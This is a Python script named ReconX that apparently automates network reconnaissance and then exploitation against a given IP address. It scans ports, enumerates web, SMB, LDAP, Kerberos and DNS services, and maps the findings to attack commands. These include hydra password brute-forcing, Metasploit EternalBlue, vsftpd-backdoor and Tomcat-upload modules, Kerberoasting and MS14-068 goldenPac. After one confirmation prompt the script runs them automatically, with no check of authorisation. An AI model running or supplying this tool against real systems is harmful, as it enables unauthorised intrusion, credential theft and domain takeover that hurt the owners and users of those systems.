#!/usr/bin/env python3
# ReconX.py - Comprehensive Recon + Auto-Exploit Tool
# Usage: sudo python3 ReconX.py <IP> [--fast]

import subprocess, sys, os, socket, threading, json, time, shutil
from datetime import datetime

# ============ COLORS ============
class C:
    R = "\033[1;31m"; G = "\033[1;32m"; Y = "\033[1;33m"
    B = "\033[1;34m"; M = "\033[1;35m"; CY = "\033[1;36m"
    W = "\033[1;37m"; E = "\033[0m"

def banner():
    print(f"""{C.R}
  ██████╗ ███████╗ ██████╗ ██████╗ ████╗ ██╗
  ██╔══██╗██╔════╝██╔════╝██╔═══██╗██ ║██║ ██║
  ██████╔╝█████╗  ██║     ██║   ██║███████║██║
  ██╔══██╗██╔══╝  ██║     ██║   ██║██ ██ ██║██║
  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ║ ██║██║
  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝ ║ ╚═╝╚═╝
      {C.W}Comprehensive Recon & Exploit Assistant{C.E}
    """)

def log(tag, msg, color=C.W):
    print(f"{color}[{tag}]{C.E} {msg}")

def run(cmd, timeout=600):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"

def have(tool):
    return shutil.which(tool) is not None

# ============ 1. HOST DISCOVERY & PORT SCAN ============
def quick_tcp_check(ip, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if s.connect_ex((ip, port)) == 0:
            return True
    except Exception:
        pass
    return False

def nmap_scan(ip, fast=False):
    log("NMAP", "Starting full scan (this may take a while)...", C.Y)
    top = "-F --min-rate 3000" if fast else "-p- --min-rate 2000"
    cmd = f"nmap -Pn -n -T4 -sV -sC {top} -oN reconx_{ip}.nmap {ip}"
    out = run(cmd, timeout=7200)
    open_ports = []
    for line in out.splitlines():
        if "/tcp" in line and "open" in line:
            parts = line.split()
            port = int(parts[0].split("/")[0])
            svc = parts[2] if len(parts) > 2 else "?"
            ver = " ".join(parts[3:]) if len(parts) > 3 else ""
            open_ports.append((port, svc, ver))
    return open_ports, out

# ============ 2. SERVICE-SPECIFIC ENUMERATION ============
def enum_web(ip, port, is_https):
    scheme = "https" if is_https else "http"
    url = f"{scheme}://{ip}:{port}"
    log("WEB", f"Enumerating {url} ...", C.CY)
    results = {"url": url}
    # headers
    results["headers"] = run(f"curl -sk -I {url} --max-time 10")
    # title
    results["title"] = run(f"curl -sk {url} --max-time 10 | grep -oiP '(?<=<title>).*?(?=</title>)' | head -1")
    # gobuster
    if have("gobuster"):
        wl = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
        if not os.path.exists(wl):
            wl = "/usr/share/wordlists/dirb/common.txt"
        results["gobuster"] = run(
            f"gobuster dir -u {url} -w {wl} -x aspx,asp,html,txt,bak,old,php,pdf "
            f"-t 30 -q --no-error --timeout 15s", timeout=1800)
    # nikto
    if have("nikto"):
        log("WEB", "Running nikto ...", C.CY)
        results["nikto"] = run(f"nikto -h {url} -timeout 10 -nointeractive", timeout=1800)
    # cert info (https)
    if is_https:
        results["cert"] = run(
            f"timeout 15 openssl s_client -connect {ip}:{port} 2>/dev/null | "
            f"openssl x509 -noout -text 2>/dev/null | grep -E 'Subject:|Issuer:|DNS:'")
    return results

def enum_smb(ip):
    log("SMB", "Enumerating SMB ...", C.CY)
    r = {"nmap": run(f"nmap -Pn -n -p445 --script smb-enum-shares,smb-enum-users,smb-vuln* -oN - {ip}", timeout=900)}
    if have("enum4linux"):
        r["enum4linux"] = run(f"enum4linux -a {ip}", timeout=900)
    if have("crackmapexec"):
        r["cme"] = run(f"crackmapexec smb {ip} -u '' -p '' --shares", timeout=300)
    elif have("netexec"):
        r["nxc"] = run(f"netexec smb {ip} -u '' -p '' --shares", timeout=300)
    return r

def enum_ldap(ip):
    log("LDAP", "Enumerating LDAP ...", C.CY)
    out = run(f"ldapsearch -x -H ldap://{ip} -s base namingContexts defaultNamingContext 2>&1", timeout=120)
    domain = None
    for line in out.splitlines():
        if "defaultNamingContext" in line and "DC=" in line:
            domain = line.split(":")[1].strip().replace("DC=", "").replace(",", ".")
    anon = run(f'ldapsearch -x -H ldap://{ip} -b "$(echo)" "(objectClass=user)" sAMAccountName 2>&1', timeout=120)
    return {"rootdse": out, "anonymous_search": anon, "domain": domain}

def enum_kerberos(ip, domain):
    log("KRB5", f"Enumerating Kerberos users (domain: {domain}) ...", C.CY)
    wl = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
    if not os.path.exists(wl):
        wl = "/usr/share/wordlists/dirb/others/names.txt" if os.path.exists("/usr/share/wordlists/dirb/others/names.txt") else None
    r = {}
    if have("kerbrute") and wl:
        r["kerbrute"] = run(f"kerbrute userenum -d {domain} --dc {ip} -t 20 {wl} -o kerbrute_users.txt", timeout=3600)
    r["nmap"] = run(f"nmap -Pn -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='{domain}' {ip}", timeout=600)
    return r

def enum_dns(ip):
    log("DNS", "Enumerating DNS ...", C.CY)
    return {"version": run(f"dig @{ip} version.bind CHAOS TXT +short", timeout=30),
            "axfr": run(f"dig @{ip} ANY AXFR +short", timeout=60)}

# ============ 3. VULNERABILITY ANALYSIS & EXPLOIT SUGGESTIONS ============
VULN_MAP = {
    445:  ("SMB", ["enum4linux-ng -A {ip}", "crackmapexec smb {ip} -u '' -p ''",
                   "nmap -p445 --script smb-vuln-ms17-010 {ip}  # EternalBlue check"]),
    3389: ("RDP", ["nmap -p3389 --script rdp-vuln* {ip}", "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {ip} rdp -t 4"]),
    21:   ("FTP", ["nmap -p21 --script ftp-anon,ftp-brute {ip}"]),
    23:   ("Telnet", ["hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {ip} telnet"]),
    5985: ("WinRM", ["crackmapexec winrm {ip} -u users.txt -p pass.txt",
                     "evil-winrm -i {ip} -u USER -p PASS"]),
    1433: ("MSSQL", ["mssqlclient.py -port 1433 USER:PASS@{ip}", "sqsh -S {ip} -U sa"]),
    3306: ("MySQL", ["mysql -h {ip} -u root -p", "hydra -L users.txt -P pass.txt {ip} mysql"]),
    8443: ("HTTPS", ["nmap -p8443 -sV -sC {ip}"]),
}
NMAP_VULN_HINTS = {
    "ms17-010": "EternalBlue! => msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; run'",
    "vsftpd 2.3.4": "vsftpd backdoor => msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip}; run'",
    "Apache Tomcat": "Try manager/gatling: msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {ip}'",
    "IIS 8.5": "IIS 8.5 => check WebDAV: 'davtest -url http://{ip}' + shortname scan",
    "Windows 2012": "Win2012R2 DC => Kerberoasting: GetUserSPNs.py {dom}/ -request -dc-ip {ip}",
    "MS14-068": "MS14-068 kerberos vuln => goldenPac.py {dom}/user@{ip}",
}

def analyze(open_ports, raw_nmap, domain):
    log("VULN", "Analyzing findings ...", C.Y)
    found = []
    for hint, exploit in NMAP_VULN_HINTS.items():
        if hint.lower() in raw_nmap.lower():
            found.append((hint, exploit.replace("{ip}", TARGET_IP).replace("{dom}", domain or "DOMAIN")))
    for port, svc, ver in open_ports:
        if port in VULN_MAP:
            name, cmds = VULN_MAP[port]
            for cmd in cmds:
                found.append((f"{name} on :{port} ({svc} {ver})", cmd.replace("{ip}", TARGET_IP)))
    return found

def interactive_exploit(open_ports, raw_nmap, domain, enums):
    print(f"\n{C.M}{'='*60}{C.E}")
    print(f"{C.M}          ANALYSIS / EXPLOIT SUGGESTIONS{C.E}")
    print(f"{C.M}{'='*60}{C.E}")
    sugg = analyze(open_ports, raw_nmap, domain)
    if not sugg:
        log("VULN", "No obvious exploitable services found automatically.", C.G)
        return
    for i, (name, cmd) in enumerate(sugg, 1):
        print(f"{C.G}  [{i}] {name}{C.E}")
        print(f"      {C.CY}--> {cmd}{C.E}")
    print(f"\n{C.Y}Do you want to proceed with exploitation? (yes/no/number){C.E}")
    ans = input(f"{C.R}ReconX >> {C.E}").strip().lower()
    if ans in ("yes", "y"):
        for i, (name, cmd) in enumerate(sugg, 1):
            log("EXPLOIT", f"Running: {cmd}", C.R)
            print(run(cmd, timeout=1800))
            print(f"\n{C.G}{'-'*60}{C.E}")
    elif ans.isdigit() and int(ans) <= len(sugg):
        name, cmd = sugg[int(ans)-1]
        log("EXPLOIT", f"Running: {cmd}", C.R)
        print(run(cmd, timeout=1800))
    else:
        log("EXPLOIT", "Skipping exploitation.", C.Y)

# ============ MAIN ============
TARGET_IP = None

def main():
    global TARGET_IP
    banner()
    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <IP> [--fast]")
        sys.exit(1)
    TARGET_IP = sys.argv[1]
    fast = "--fast" in sys.argv
    report = {"target": TARGET_IP, "date": datetime.now().isoformat()}

    log("INFO", f"Target: {TARGET_IP}  |  Mode: {'FAST' if fast else 'FULL'}", C.W)
    if not quick_tcp_check(TARGET_IP, 445, 3) and not quick_tcp_check(TARGET_IP, 80, 3):
        log("INFO", "Host may block pings - forcing -Pn in nmap anyway.", C.Y)

    # ---- Scan ----
    open_ports, raw = nmap_scan(TARGET_IP, fast)
    if not open_ports:
        log("NMAP", "No open ports found.", C.R)
        sys.exit(0)
    print(f"\n{C.G}OPEN PORTS:{C.E}")
    for p, s, v in open_ports:
        print(f"  {C.G}{p}/tcp{C.E}  {s:<15} {v}")
    report["open_ports"] = open_ports
    report["nmap_raw"] = raw

    # ---- Enumerate per service ----
    domain = None
    enums = {}
    for port, svc, ver in open_ports:
        if port in (80, 8080, 8000):
            enums[f"web_{port}"] = enum_web(TARGET_IP, port, False)
        elif port in (443, 8443):
            enums[f"web_{port}"] = enum_web(TARGET_IP, port, True)
        elif port == 445:
            enums["smb"] = enum_smb(TARGET_IP)
        elif port == 389:
            enums["ldap"] = enum_ldap(TARGET_IP)
            domain = enums["ldap"].get("domain")
        elif port == 88 and domain:
            enums["kerberos"] = enum_kerberos(TARGET_IP, domain)
        elif port == 53:
            enums["dns"] = enum_dns(TARGET_IP)

    # try to get domain from ldap rootdse even if port 389 closed enum path
    if not domain:
        m = [l for l in raw.splitlines() if "Domain:" in l]
        if m:
            domain = m[0].split("Domain:")[1].strip().split(",")[0]
    report["domain"] = domain
    report["enumeration"] = enums

    # ---- Print summary ----
    print(f"\n{C.M}{'='*60}{C.E}")
    print(f"{C.M}          ENUMERATION SUMMARY{C.E}")
    print(f"{C.M}{'='*60}{C.E}")
    for k, v in enums.items():
        print(f"\n{C.CY}### {k} ###{C.E}")
        if isinstance(v, dict):
            for sk, sv in v.items():
                if sv and str(sv).strip():
                    print(f"  -- {sk} --")
                    print(str(sv)[:3000])
        else:
            print(str(v)[:3000])

    # ---- Interactive exploit ----
    interactive_exploit(open_ports, raw, domain, enums)

    # ---- Save report ----
    with open(f"reconx_{TARGET_IP}.json", "w") as f:
        json.dump(report, f, indent=2, default=str)
    log("DONE", f"Full report saved: reconx_{TARGET_IP}.json  |  nmap: reconx_{TARGET_IP}.nmap", C.G)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.R}[!] Interrupted.{C.E}")
